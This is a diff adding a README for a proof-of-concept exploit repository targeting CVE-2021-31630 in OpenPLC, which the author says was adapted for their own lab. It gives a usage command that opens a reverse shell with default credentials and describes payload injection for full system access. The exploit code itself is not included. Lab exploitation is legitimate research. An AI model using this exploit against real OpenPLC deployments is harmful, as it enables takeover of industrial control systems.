@@ -1,1 +1,32 @@
 
+# CVE-2021-31630 OpenPLC Exploit
+
+## Overview
+This repository contains a Proof of Concept (PoC) exploit for **CVE-2021-31630**, a vulnerability in OpenPLC that allows remote code execution. After researching and analyzing multiple public exploits, I modified and adapted them for my own lab setup. By leveraging this exploit, I was able to gain a **reverse shell** and access the OpenPLC web server.
+
+## Usage
+To execute the exploit, run:
+
+```bash
+python exploit.py -ip <LISTEN_IP> -p <LISTEN_PORT> -u <USERNAME> -pwd <PASSWORD>
+```
+
+Example:
+```bash
+python exploit.py -ip 192.168.1.100 -p 1337 -u openplc -pwd openplc
+```
+
+## Arguments
+- `-ip <LISTEN_IP>` : The IP address to listen on for the reverse shell.
+- `-p <LISTEN_PORT>` : The port number to listen on.
+- `-u <USERNAME>` : The username required for OpenPLC login.
+- `-pwd <PASSWORD>` : The password required for OpenPLC login.
+
+## Description
+This exploit takes advantage of the **CVE-2021-31630** vulnerability found in OpenPLC, enabling an attacker to achieve **remote code execution**. By providing the necessary credentials and connecting to the OpenPLC web server, the script injects a payload that triggers a reverse shell, granting full access to the system.
+
+## Author
+Modified  by **Sulaiman Alhasawi**
+
+
+
